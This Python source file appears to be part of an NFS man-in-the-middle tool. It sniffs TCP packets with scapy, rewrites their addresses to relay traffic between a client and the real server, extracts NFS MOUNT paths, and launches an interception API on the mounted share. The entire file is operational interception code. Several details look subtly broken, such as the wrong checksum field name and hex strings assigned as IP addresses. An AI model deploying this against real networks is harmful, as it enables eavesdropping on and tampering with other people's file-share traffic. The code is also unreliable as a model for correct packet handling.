import _thread
import ipaddress
import socket
import threading

from nfspionage_api import NfspionageApi
from scapy.compat import raw
from scapy.contrib.mount import MOUNT_Call
from scapy.contrib.oncrpc import RPC
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether
from scapy.sendrecv import sniff, sr1


# @PARAM
# packet        scapy       packet object
# protocol      string      TCP, UDP
# dir           bool
def print_ip_addr(packet, protocol=TCP, src=False):
	if IP in packet:
		if src:
			return packet[IP].src + ":" + str(packet[protocol].sport)
		else:
			return packet[IP].dst + ":" + str(packet[protocol].dport)


def protocol_str(protocol):
	if protocol == TCP:
		return "tcp"
	else:
		return "udp"


def print_packet_transfer(protocol, packet):
	print("[+ " + protocol_str(protocol).upper() + " ] " + print_ip_addr(packet, src=True) + " >>> " + print_ip_addr(packet, src=False) + " [" + str(len(packet)) + "]")


def tuple_to_addr(address):
	return str(address[0]) + ":" + str(address[1])


'''
# ==============================================================================
# MITM FORWARDER ===============================================================
# ==============================================================================
'''


class MitmForwarder:
	server_address = None
	spoof_address = None
	target_port = None

	client_address = None
	mount_ports = []

	def __init__(self, remote_ip, port, udp=False):
		self.server_address = remote_ip
		self.target_port = port
		self.spoof_address = remote_ip
		print("// ========================================")
		print("// Starting MitmForwarder...")
		print("// [*] LOC Addr:\t127.0.0.1:" + str(port))
		print("// [*] REM Addr:\t" + remote_ip + ":" + str(port))
		if udp:
			print("// [*] PROT:\t\tUDP")
			self.udp_proxy()
		else:
			print("// [*] PROT:\t\tTCP")
			self.tcp_proxy()
		print("// ========================================")

	def update_client_address(self, packet):
		if packet[IP].src is not self.server_address:
			self.client_address = packet[IP].src

	# ==================== TCP FORWARDING ==================== #

	# create tcp servers to listen for and forward connections to target
	def tcp_proxy(self):
		# create thread for python socket to "accept" messages
		threading.Thread(target=self.tcp_listen, args=('', self.target_port)).start()

		# listen with scapy to actually forward and process
		str_filter = "tcp and port " + str(self.target_port)
		sniff(filter=str_filter, prn=self.transfer_tcp)

	def tcp_listen(self, host, port):
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.bind(('', port))
		if host == '':  # server
			sock.listen()
			while True:
				connection, client_address = sock.accept()
				self.tcp_listen(self.server_address, client_address[1])  # when receiving message, try to create proxy socket on localhost
		else:  # 'client'
			try:
				sock.connect((host, port))
				sock.recv(64512)
			except:
				pass

	def transfer_tcp(self, pkt):
		pkt.summary()
		if Ether in pkt:
			pkt[Ether].checksum = None  # ask scapy to regenerate
		if IP in pkt:  # only process packets with IP layer
			try:
				self.filter_packets(pkt)
			except Exception as e:
				print("[EXP *] Filtering packet: " + str(e))
			pkt[IP].checksum = None  # ask scapy to regenerate
			if Ether in pkt:
				pkt[Ether].checksum = None  # ask scapy to regenerate it
			print_packet_transfer(TCP, pkt)
			self.update_client_address(pkt)
			if pkt[IP].src != self.server_address:  # packet is NOT from server -> forward to server
				pkt[IP].dst = hex(int(ipaddress.IPv4Address(self.server_address)))
				pkt[TCP].dport = self.target_port
				print("\t - forwarding to " + str(self.server_address))
			else:  # packets is from server -> forward to client
				pkt[IP].dst = hex(int(ipaddress.IPv4Address(self.client_address)))
				print("\t - forwarding to " + str(self.client_address))
			sr1(pkt)

	# ==================== PACKET FILTERING ==================== #

	# filter packets for data of interest - i.e., mount port and mount path
	def filter_packets(self, pkt):
		# filter path, start mitm API
		path = self.filter_mount_path(pkt)
		if path != -1:  # if proper mount path, start API on path for clients
			print("[* INF ] starting NFS MITM API on path \'" + path + "\'")
			_thread.start_new_thread(NfspionageApi, (self.server_address, path))

	@staticmethod
	def filter_mount_path(pkt):
		try:  # try to convert to MOUNT_Call packet
			mnt_pkt = RPC(MOUNT_Call(raw(pkt)))
			path = mnt_pkt.path.path.decode('utf-8')
			print("[* INF ] MOUNT on path " + path)
			return path
		except Exception as e:  # error getting mount path
			# print("[- EXP ] " + str(e))
			return -1
